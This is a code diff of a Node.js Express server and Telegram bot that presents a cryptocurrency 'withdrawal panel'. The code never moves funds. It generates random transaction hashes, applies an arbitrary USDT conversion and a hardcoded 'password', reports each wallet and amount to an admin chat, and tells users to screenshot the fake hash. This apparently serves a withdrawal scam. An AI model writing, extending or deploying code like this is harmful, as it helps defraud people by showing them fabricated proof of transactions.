@@ -1,102 +1,131 @@
-const express = require("express");
-const { Telegraf } = require("telegraf");
-const path = require("path");
+import express from "express";
+import bodyParser from "body-parser";
+import cors from "cors";
+import { Telegraf } from "telegraf";
+import crypto from "crypto";
 
-// --- ENV ---
+const app = express();
+app.use(cors());
+app.use(bodyParser.json());
+
+// =========================
+// ENV
+// =========================
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
 const WEBHOOK_URL = process.env.WEBHOOK_URL;
 
-if (!BOT_TOKEN || !WEBHOOK_URL) {
-    console.error("❌ Missing env BOT_TOKEN or WEBHOOK_URL");
-    process.exit(1);
-}
+if (!BOT_TOKEN || !ADMIN_CHAT_ID || !WEBHOOK_URL)
+  console.log("❌ Missing environment variables");
 
-// --- Telegram Bot ---
 const bot = new Telegraf(BOT_TOKEN);
 
-// --- In-memory user data ---
+// =========================
+// In-Memory Data (can replace with DB later)
+// =========================
 let userData = {
-    wallet: null
+  wallet: null,
+  password: null,
 };
 
-// Telegram Commands
-bot.start((ctx) => ctx.reply("Bot running (Webhook Mode) 🚀"));
-bot.help((ctx) => ctx.reply("Send /start"));
+// =========================
+// Telegram Webhook
+// =========================
+bot.telegram.setWebhook(`${WEBHOOK_URL}/webhook`);
+app.use(bot.webhookCallback("/webhook"));
 
-// Handle messages
-bot.on("text", (ctx) => {
-    ctx.reply("Message received: " + ctx.message.text);
+// Basic Commands
+bot.start((ctx) => ctx.reply("Welcome! Withdrawal panel is ready."));
+bot.help((ctx) => ctx.reply("Send /withdraw to open withdrawal panel."));
+bot.command("withdraw", (ctx) => {
+  ctx.reply("Click below to open withdrawal panel:", {
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: "Open Withdrawal Page", web_app: { url: WEBHOOK_URL } }],
+      ],
+    },
+  });
 });
 
-// --- Express Server ---
-const app = express();
-app.use(express.json());
-app.use(express.urlencoded({ extended: false }));
-
-// Enable CORS for frontend
-app.use((req, res, next) => {
-    res.setHeader("Access-Control-Allow-Origin", "*");
-    res.setHeader("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
-    res.setHeader("Access-Control-Allow-Headers", "Content-Type");
-    if (req.method === "OPTIONS") return res.sendStatus(200);
-    next();
-});
-
-// --- API: GET wallet ---
+// =========================
+// API — Get Wallet Status
+// =========================
 app.get("/api/wallet", (req, res) => {
-    res.json({ wallet: userData.wallet });
+  res.json({
+    wallet: userData.wallet,
+  });
 });
 
-// --- API: POST wallet ---
+// =========================
+// API — Bind / Update Wallet
+// =========================
 app.post("/api/wallet", (req, res) => {
-    const { wallet } = req.body;
+  const { wallet, oldWallet } = req.body;
 
-    if (!wallet) return res.json({ success: false, error: "Wallet required" });
+  if (!wallet) return res.json({ success: false, error: "Wallet required" });
 
-    userData.wallet = wallet;
+  // Bind once — unless modifying
+  if (!oldWallet && userData.wallet)
+    return res.json({
+      success: false,
+      error: "Wallet already bound",
+    });
 
-    // Notify Admin
-    bot.telegram.sendMessage(
-        ADMIN_CHAT_ID,
-        `🔐 New wallet bound:\n${wallet}`
-    );
+  userData.wallet = wallet;
 
-    return res.json({ success: true, wallet });
+  res.json({
+    success: true,
+    wallet: userData.wallet,
+  });
 });
 
-// --- API: POST withdraw ---
-app.post("/api/withdraw", (req, res) => {
-    const { coin, amount, wallet } = req.body;
+// =========================
+// API — Submit Withdrawal
+// =========================
+app.post("/api/withdraw", async (req, res) => {
+  const { coin, amount, wallet } = req.body;
 
-    if (!wallet) return res.json({ success: false, error: "Wallet missing" });
+  if (!wallet) return res.json({ success: false, error: "Wallet required" });
+  if (!amount || amount <= 0)
+    return res.json({ success: false, error: "Invalid amount" });
 
-    const fakeHash = "0x" + Math.random().toString(16).substring(2, 15);
+  const usdtValue = (amount * 50 - 0.1).toFixed(4);
+  const password = userData.password || "44721";
+  userData.password = password;
 
-    // Notify Admin
-    bot.telegram.sendMessage(
-        ADMIN_CHAT_ID,
-        `💸 Withdrawal Request\nCoin: ${coin}\nAmount: ${amount}\nWallet: ${wallet}\nHash: ${fakeHash}`
-    );
+  const txHash =
+    "TX-" + crypto.randomBytes(6).toString("hex") + "-" + Date.now().toString().slice(-6);
 
-    return res.json({ success: true, hash: fakeHash });
+  // Telegram Notify
+  const msg = `
+📤 NEW WITHDRAWAL REQUEST
+--------------------------------
+💰 Coin: ${coin}
+🔢 Amount: ${amount}
+💵 USDT: ${usdtValue}
+🏦 Wallet: ${wallet}
+🔐 Password: ${password}
+🆔 Transaction Hash: ${txHash}
+
+⚠️ Wallet & password can be bound once.
+Please screenshot the transaction hash for record.
+`;
+
+  await bot.telegram.sendMessage(ADMIN_CHAT_ID, msg);
+
+  res.json({
+    success: true,
+    hash: txHash,
+  });
 });
 
-// --- Static Frontend ---
-app.use(express.static(path.join(__dirname, "public")));
-
-// Fallback
-app.get("*", (req, res) => {
-    res.sendFile(path.join(__dirname, "public", "index.html"));
+// =========================
+// Server Start
+// =========================
+app.get("/", (req, res) => {
+  res.sendFile("/app/public/index.html");
 });
 
-// --- Webhook Handling ---
-app.use(bot.webhookCallback("/telegraf"));
-
-bot.telegram.setWebhook(`${WEBHOOK_URL}/telegraf`);
-
-console.log("🚀 Webhook set to:", `${WEBHOOK_URL}/telegraf`);
-
-// --- Start Server ---
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Server Running on ${PORT}`));
+app.listen(3000, () => {
+  console.log("🚀 Server running on port 3000");
+});
